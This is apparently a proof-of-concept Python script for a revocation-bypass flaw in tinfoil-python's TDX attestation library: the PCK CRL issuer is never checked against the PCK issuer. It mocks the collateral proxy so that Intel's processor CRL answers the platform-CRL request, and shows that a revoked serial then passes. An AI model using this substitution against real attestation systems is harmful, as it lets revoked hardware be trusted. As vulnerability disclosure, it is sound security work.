"""
PoC: tinfoil-python 0.14.0 -- PCK CRL issuer is never bound to the PCK issuer.

collateral_tdx.fetch_pck_crl(ca_type) accepts ANY CRL whose signature verifies
under ANY Intel-rooted chain carried in the SGX-PCK-CRL-Issuer-Chain header; it
never checks crl.issuer == pck_cert.issuer (nor that the signing cert is the CA
named by ca_type). validate_certificate_revocation() then looks the PCK serial up
in whatever CRL was returned. The collateral delivery path (tdx-proxy.tinfoil.sh,
Tinfoil-operated and outside the enclave) can therefore answer the "platform"
CRL request with Intel's genuine *processor* CRL, so a PCK certificate revoked by
the Platform CA is never seen as revoked.

All CRLs / chains are genuine Intel-signed artifacts fetched today from Intel PCS
(public collateral). The revoked platform PCK certificate itself is not public,
so a stand-in certificate carrying a serial taken from Intel's real platform CRL
is used for the serial lookup (validate_certificate_revocation reads only
.serial_number from the PCK). The fetch-path acceptance of the wrong-CA CRL is
demonstrated with the real Intel-signed Platform-CA PCK from the sample quote.

Usage: python -I poc_crl_substitution.py <intel-pcs dir> <quote.dat>
"""
import datetime as _dt
import os
import sys
import tempfile
from unittest import mock
from urllib.parse import unquote

import requests
from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import NameOID

import tinfoil
import tinfoil.attestation.collateral_tdx as ct
from tinfoil.attestation.abi_tdx import parse_quote
from tinfoil.attestation.verify_tdx import extract_pck_cert_chain, verify_pck_chain
from tinfoil.attestation.pck_extensions import extract_pck_extensions

PCS = sys.argv[1]
QUOTE = open(sys.argv[2], "rb").read()


def rd(name, mode="rb"):
    with open(os.path.join(PCS, name), mode) as f:
        return f.read()


def hdr(name, key):
    for line in rd(name, "r").splitlines():
        if line.lower().startswith(key.lower() + ":"):
            return line.split(":", 1)[1].strip()
    raise KeyError(key)


PLATFORM_CRL = rd("pckcrl_platform.pem")
PLATFORM_CHAIN = hdr("pckcrl_platform.headers", "SGX-PCK-CRL-Issuer-Chain")
PROCESSOR_CRL = rd("pckcrl_processor.pem")
PROCESSOR_CHAIN = hdr("pckcrl_processor.headers", "SGX-PCK-CRL-Issuer-Chain")
ROOT_CRL = rd("IntelSGXRootCA.der")
TCB_LATEST = rd("tcb_50806f000000_latest.json")
TCB_CHAIN = hdr("tcb_50806f000000_latest.headers", "TCB-Info-Issuer-Chain")
QE_LATEST = rd("qe_identity_latest.json")
QE_CHAIN = hdr("qe_identity_latest.headers", "SGX-Enclave-Identity-Issuer-Chain")


def make_proxy(platform_crl_body, platform_crl_chain, log):
    """Stand-in for https://tdx-proxy.tinfoil.sh: everything genuine, except the
    answer to ?ca=platform is whatever the attacker chooses."""
    def _get(url, timeout=None, **kw):
        log.append(url)
        assert url.startswith("https://tdx-proxy.tinfoil.sh/"), url
        r = requests.Response(); r.status_code = 200; r.url = url
        if "/tdx/certification/v4/tcb?" in url:
            r._content = TCB_LATEST; r.headers["TCB-Info-Issuer-Chain"] = TCB_CHAIN
        elif "/tdx/certification/v4/qe/identity" in url:
            r._content = QE_LATEST; r.headers["SGX-Enclave-Identity-Issuer-Chain"] = QE_CHAIN
        elif "/sgx/certification/v4/pckcrl?ca=platform" in url:
            r._content = platform_crl_body; r.headers["SGX-PCK-CRL-Issuer-Chain"] = platform_crl_chain
        elif url.endswith("/IntelSGXRootCA.der"):
            r._content = ROOT_CRL
        else:
            raise AssertionError(url)
        return r
    return _get


def stand_in_cert(serial: int) -> x509.Certificate:
    """Self-signed stand-in carrying a serial from Intel's real platform CRL.
    validate_certificate_revocation() reads only .serial_number from the PCK."""
    key = ec.generate_private_key(ec.SECP256R1())
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "stand-in for a revoked Intel SGX PCK Certificate")])
    now = _dt.datetime.now(_dt.timezone.utc)
    return (x509.CertificateBuilder().subject_name(name).issuer_name(name).public_key(key.public_key())
            .serial_number(serial).not_valid_before(now - _dt.timedelta(days=1))
            .not_valid_after(now + _dt.timedelta(days=1)).sign(key, hashes.SHA256()))


def main():
    print("tinfoil package:", tinfoil.__file__)
    q = parse_quote(QUOTE)
    chain = extract_pck_cert_chain(q)
    verify_pck_chain(chain)  # real Intel-signed PCK chain from the sample quote
    ext = extract_pck_extensions(chain.pck_cert)
    print("sample quote PCK: issuer CN =", chain.pck_cert.issuer.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value,
          "| serial =", hex(chain.pck_cert.serial_number), "| fmspc =", ext.fmspc)
    p_crl = x509.load_pem_x509_crl(PLATFORM_CRL)
    r_crl = x509.load_pem_x509_crl(PROCESSOR_CRL)
    print("Intel platform  CRL: issuer CN =", p_crl.issuer.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value,
          "| revoked =", len(list(p_crl)), "| nextUpdate =", p_crl.next_update_utc.date())
    print("Intel processor CRL: issuer CN =", r_crl.issuer.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value,
          "| revoked =", len(list(r_crl)), "| nextUpdate =", r_crl.next_update_utc.date())
    revoked_serial = list(p_crl)[0].serial_number
    print("a serial Intel revoked under the Platform CA:", hex(revoked_serial))

    results = {}
    # ---- 1. fetch path: ?ca=platform answered with the genuine processor CRL -----------------
    with tempfile.TemporaryDirectory() as d, mock.patch.object(ct, "_TDX_CACHE_DIR", d):
        log = []
        with mock.patch.object(ct.requests, "get", make_proxy(PROCESSOR_CRL, PROCESSOR_CHAIN, log)):
            collateral = ct.fetch_collateral(ext, chain.pck_cert)
        got = collateral.pck_crl
        print(f"\n[1] fetch_collateral() for a Platform-CA PCK: ca_type={got.ca_type!r} but CRL issuer CN = "
              f"{got.crl.issuer.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value!r} -> ACCEPTED (no issuer binding)")
        results["fetch_accepts_wrong_ca_crl"] = got.crl.issuer == r_crl.issuer
        with mock.patch.object(ct.requests, "get", lambda *a, **k: (_ for _ in ()).throw(AssertionError("no network"))):
            cached = ct.fetch_collateral(ext, chain.pck_cert)
        print("    cache hit (next session, no network) still serves the processor CRL as 'platform':",
              cached.pck_crl.crl.issuer == r_crl.issuer)

        # ---- 2. revocation outcome for a PCK serial that Intel revoked under the Platform CA ----
        pck_revoked = stand_in_cert(revoked_serial)
        genuine = ct.TdxCollateral(tcb_info=collateral.tcb_info, qe_identity=collateral.qe_identity,
                                   tcb_info_raw=b"", qe_identity_raw=b"",
                                   pck_crl=ct.PckCrl(crl=p_crl, ca_type="platform", next_update=p_crl.next_update_utc),
                                   root_crl=collateral.root_crl,
                                   tcb_info_issuer_chain=collateral.tcb_info_issuer_chain,
                                   qe_identity_issuer_chain=collateral.qe_identity_issuer_chain)
        try:
            ct.validate_certificate_revocation(genuine, pck_revoked, chain.intermediate_cert)
            print("[2] control: genuine platform CRL -> ACCEPTED (unexpected)")
            results["control_rejects"] = False
        except ct.CollateralError as e:
            print(f"[2] control: genuine platform CRL -> REJECTED: {e}")
            results["control_rejects"] = True
        try:
            ct.validate_certificate_revocation(collateral, pck_revoked, chain.intermediate_cert)
            print("[3] attack: processor CRL substituted by the collateral path -> ACCEPTED (revocation bypassed)")
            results["attack_accepts"] = True
        except ct.CollateralError as e:
            print(f"[3] attack: -> REJECTED: {e}")
            results["attack_accepts"] = False

    print("\nSUMMARY:", results)
    ok = all(results.values())
    print("matches expected:", ok)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
